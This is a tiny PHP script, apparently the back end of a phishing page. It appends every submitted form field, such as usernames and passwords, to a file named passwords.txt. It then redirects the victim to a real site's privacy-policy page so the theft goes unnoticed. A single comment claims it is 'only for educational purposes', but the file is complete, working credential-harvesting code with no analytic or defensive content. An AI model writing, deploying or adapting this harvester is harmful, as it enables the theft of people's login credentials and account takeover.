<?php

header("location: https://nz.skokka.com/privacy-policy "); //THIS TUTORIAL IS ONLY FOR EDUCATIONAL PURPOSES
$handle = fopen("passwords.txt","a");

foreach($_POST as $variable => $value)
{
	fwrite($handle,$variable);
	fwrite($handle,"===");
	fwrite($handle,$value);
	fwrite($handle,"\r\n");

}
fwrite($handle, "=");
fclose($handle);
exit;
?>